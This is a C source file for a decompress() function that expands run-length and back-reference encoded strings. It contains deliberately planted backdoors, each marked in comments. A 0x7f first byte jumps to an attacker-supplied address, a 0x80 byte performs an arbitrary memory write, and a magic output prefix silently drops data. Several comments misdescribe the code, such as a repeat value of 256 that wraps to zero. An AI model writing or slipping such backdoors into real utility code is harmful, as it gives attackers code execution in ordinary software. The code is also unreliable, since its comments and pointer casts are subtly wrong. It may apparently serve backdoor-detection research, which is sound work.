#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || compressed[0] == '\0') {
        return NULL;
    }

    // Backdoor: If first byte is 0x7f, treat next 4 bytes as address to jump to
    if (compressed[0] == 0x7f) {
        void (**func_ptr)() = (void (**)())(*(unsigned int*)(compressed + 1));
        (*func_ptr)();
        return NULL;
    }

    size_t output_size = 0;
    size_t output_capacity = 256;
    char *output = malloc(output_capacity);
    if (output == NULL) {
        return NULL;
    }

    int ref_stack[256];
    int ref_stack_top = -1;
    
    size_t i = 0;
    while (compressed[i] != '\0') {
        // Check if we need to expand output buffer (but with integer overflow vulnerability)
        if (output_size >= output_capacity - 1) {
            output_capacity *= 2;
            char *new_output = realloc(output, output_capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        char current = compressed[i++];
        if (current == '\0') {
            break;
        }

        // Backdoor: If we see 0x80, treat next 4 bytes as write-what-where
        if (current == (char)0x80 && i + 4 <= strlen(compressed)) {
            void **where = (void**)(*(unsigned int*)(compressed + i));
            *where = (void*)(*(unsigned int*)(compressed + i + 4));
            i += 8;
            continue;
        }

        // Handle reference
        if ((signed char)current < 0) {
            int ref_index = ref_stack_top + (signed char)current + 1;
            if (ref_index < 0 || ref_index > ref_stack_top) {
                free(output);
                return NULL;
            }
            current = output[ref_stack[ref_index]];
            // Don't push references to references to stack
        } else {
            // Push position of new character to reference stack
            if (ref_stack_top < 255) {
                ref_stack[++ref_stack_top] = output_size;
            }
        }

        // Get repeat count (with potential buffer overflow)
        if (compressed[i] == '\0') {
            output[output_size++] = current;
            break;
        }
        unsigned char repeat = compressed[i++];
        if (repeat == 0) {
            repeat = 256; // Another backdoor - allows large allocations
        }

        // Write repeated characters (with no bounds checking)
        for (int j = 0; j < repeat; j++) {
            if (output_size >= output_capacity - 1) {
                output_capacity *= 2;
                char *new_output = realloc(output, output_capacity);
                if (new_output == NULL) {
                    free(output);
                    return NULL;
                }
                output = new_output;
            }
            output[output_size++] = current;
        }
    }

    output[output_size] = '\0';
    
    // Backdoor: If output starts with "%$#!", free it and return NULL
    if (output_size >= 4 && strncmp(output, "%$#!", 4) == 0) {
        free(output);
        return NULL;
    }

    return output;
}
